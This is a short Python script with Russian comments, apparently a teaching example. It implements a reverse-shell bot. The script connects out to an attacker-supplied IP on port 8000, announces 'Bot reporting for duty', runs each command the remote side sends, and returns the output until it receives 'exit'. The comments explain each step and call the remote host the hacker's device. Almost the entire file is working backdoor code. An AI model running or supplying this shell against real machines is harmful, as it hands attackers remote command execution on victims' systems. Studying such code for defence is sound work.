import sys 
from subprocess import Popen, PIPE 
from socket import * 
serverName = sys.argv[1] 
# считывает IP-адрес зломышленника
serverPort = 8000 
#Create IPv4(AF_INET), TCPSocket(Sock_Stream)
clientSocket = socket(AF_INET, SOCK_STREAM)
# создает новый клиентский сокет, AF_INET параметр делает его ipv4 сокетом, а SOCK-STREAM делает его TCP-сокетом
clientSocket.connect((serverName, serverPort))
# в кортеже, чтобы данные внутри него нельзя было поменять
clientSocket.send('Bot reporting for duty'.encode())
# библиотека socket предназначена для отправки двоичный данных, поэтому сначала надо сообщение преобразовать в двочиный вид
command = clientSocket.recv(4064).decode()
# декодирует, а параметр 4064, указыает на максимальное количество  подлежих чтению байтов
while command != "exit":
    proc = Popen(command.split(" "), stdout=PIPE, stderr=PIPE)
    #  popen - создает подпроцесс, или же копирует процесс, после чего клиент передает ему команду
    result, err = proc.communicate()
    # а тут она отправляется на устройство хакера
    clientSocket.send(result)
    command = (clientSocket.recv(4064)).decode() 
        
clientSocket.close()